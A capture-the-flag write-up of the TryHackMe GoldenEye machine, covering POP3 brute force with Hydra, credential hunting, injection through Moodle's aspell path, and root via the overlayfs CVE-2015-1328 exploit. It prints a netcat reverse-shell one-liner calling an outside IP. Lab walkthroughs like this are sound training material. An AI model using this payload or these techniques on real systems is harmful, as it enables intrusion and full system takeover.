---
title: GoldenEye TryHackMe Writeup
tags: [hydra,writeup,tryhackme,telnet,pop3,linux,overlays,aspell]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/1.png)

## Scanning
We perform a quick and aggressive scan (**not recommended in real environments**) to detect open ports on the server.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/2.png)

Then, knowing the ports, we will launch an nmap with scripts and versions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/2-2.png)

## Enumeration

We access the website, find a message with the mission and it tells us to enter the *"/sev-home/"* directory to log in with *"UNKNOWN"* user.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/3.png)

We see that it asks for credentials, so we may need to brute force it.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/4.png)

We review the source code, access the *"terminal.js"* file and identify an encoded password.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/5.png)

#### Password Decode

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/6.png)

We enter the credentials obtained (using the user *"boris"*) and we are invited to send an email to a GoldenEye supervisor.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/7.png)

We revisit the source code and list two supervisors.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/8.png)

We launch **Hydra** with a list of the two supervisors and a quick dictionary with most used passwords, we will get the new password of the user *"boris"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/10.png)

We connect by **Telnet** with the obtained credentials, we see that we have *3 mails* in the tray.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/11.png)

We read the *3rd email*, it seems that *Boris* saved the codes in the root of the root folder

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/12.png)

The next thing I tried was to catch all the users obtained from the emails and in the enumeration phase, I re-launched the same dictionary and the login credentials of the user *"Natalya"* appeared.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/13.png)

We use the new credentials, read the emails where we will get some credentials and a web address that we will have to add to our *"/etc/hosts"* file.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/14.png)

We log in, check **Moodle** and find a message from a *"Dr. Doak"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/15.png)

We try again to brute force the POP3 service with the user *"doak"* and we get the credentials of this user. Yes, that's right! We reconnect via **Telnet** and see your emails ;)

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/16.png)

#### Credentials obtained from Doak mailings.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/17.png)

We connect to **Moodle** with the credentials obtained, look in its files and find one called *"s3cret.txt"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/18.png)

#### Contents of file "s3cret.txt":

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/19.png)

We access the path of the link and download the image to our kali.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/20.png)

We analyze with the tool "Exiftool" and we see that it contains a password encoded in base64.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/21.png)

## Exploitation

Log in with the administrator credentials, reviewing all the options we find the *"Path to aspell"* (we were previously given a hint of aspell).

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/22.png)

#### Payload

```bash
sh -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f'
```

Create a new entry and click on the button.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/23.png)

#### Reverse shell

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/24.png)

## Privilege Escalation

We do a reconnaissance phase, but we do not find anything useful. We launch the **Linux exploit suggester** script, it lists several scripts that we can use. In my case, I used the *"CVE-2015-1328 - OVERLAYFS"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/25.png)

We host the file to compile it on the victim machine, but the **"gcc"** binary is not installed, but in the recognition phase we detect a binary called **"cc"**, if we use **"file"** on it we see several symbolic links until we find **"clang"**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/26.png)

We modify the exploit by changing the **"gcc"** binary to **"cc"**, compile and run the exploit becoming root.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/27.png)

We read the root flag and it gives us the path with the deactivation codes.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/28.png)

MISSION COMPLETED!!

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/GoldenEye/29.png)




